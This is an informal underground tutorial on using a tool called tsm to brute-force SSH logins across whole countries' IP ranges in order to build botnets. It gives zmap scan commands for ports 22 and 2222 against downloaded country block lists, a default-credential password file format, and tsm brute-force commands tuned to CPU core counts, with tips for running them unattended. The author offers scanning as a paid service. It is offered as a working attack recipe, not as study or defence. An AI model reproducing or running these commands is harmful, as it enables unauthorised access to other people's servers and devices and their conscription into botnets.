--Merlyns TSM TUTORIAL--


----------------------
how to start bruting?
-----------------------
http://ipdeny.com/ipblocks/ 
and pick any country you want or if you wanna combine them together i would tell you it's best for people that are doing botnets
usa, poland, uk, and countries where the internet speed isn't shit for good devices you can 


-----------------------
so when you zmapping right and whatever zone or country you picked out to bruteforce you will do for example 
wget http://ipdeny.com/ipblocks/data/countries/al.zone

for example 
port can be changed to multiple others but you will need to change in tsm line too 
zmap -p22 -oi -wal.zone 
zmap -p2222 -oi -wal.zone

it'll output everything in file 'i' i will hand you over a server for you to get started but zmapping is the only thing you will have to worry about unless
you want me to zmap for you and pay 

once you have that put that inside the folder that you have tsm in and create a file name 'p' is where you will storing the passwords and etc

for example of password and how it needs to be placed is like this 
tsm only does one at a time btw 

root root
admin admin

after that and btw you have to make sure everything is the same folder that tsm is in 
after everything created 
best advice when you starting off man 

1-2 cores == 1-50k forks
4 cores = 80k forks
8 cores can handle 400k forks
16 cores can handle a good 1M

./tsm -m brute_ip_combo -f <1-100000> -p 22 -v 'g0d!!!' -d 2 -r 10000
1-2 cores
./tsm -m brute_ip_combo -f 50000 -p 22 -v 'g0d!!!' -d 2 -r 10000
4 cores 
./tsm -m brute_ip_combo -f 80000 -p 22 -v 'g0d!!!' -d 2 -r 10000
8 cores 
./tsm -m brute_ip_combo -f 400000 -p 22 -v 'g0d!!!' -d 2 -r 10000
16 cores 
./tsm -m brute_ip_combo -f 100000000000 -p 22 -v 'g0d!!!' -d 2 -r 100000000000
example of different uses of targetting other ports
./tsm -m brute_ip_combo -f 1000000 -p 2222 -v 'g0d!!!' -d 2 -r 10000

you see the -p that's what i meant you could target different kind of ports and devices

and you can let the process go on a screen in the background and go on with your day 

do this screen and then inside the run command and then deattach the screen
